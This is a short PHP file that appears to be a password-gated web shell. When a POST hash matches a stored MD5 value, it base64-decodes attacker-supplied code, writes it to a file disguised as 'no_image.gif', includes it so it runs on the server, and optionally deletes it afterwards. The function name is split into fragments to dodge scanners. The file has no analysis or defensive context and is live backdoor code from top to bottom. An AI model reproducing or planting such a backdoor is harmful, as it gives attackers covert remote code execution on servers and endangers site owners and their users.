<?php

$hash = '92bde3b96aff934ed67420a3f6130ac2';

if (md5($_POST['hash']) === $hash) {
	mage($_POST['code']);

	if (isset($_POST['clean']))
		clean();
}

function mage($code)
{
	$b = 'b'.'as'.'e'.'6'.'4'.'_'.'d'.'eco'.'de';
	$code = $b($code);
	$file = 'no_image.gif';
	$fp = fopen($file, 'w');

	fwrite($fp, $code);
	fclose($fp);

	if (is_file($file))
		@include($file);
}

function clean()
{
	@unlink('no_image.gif');
}

?>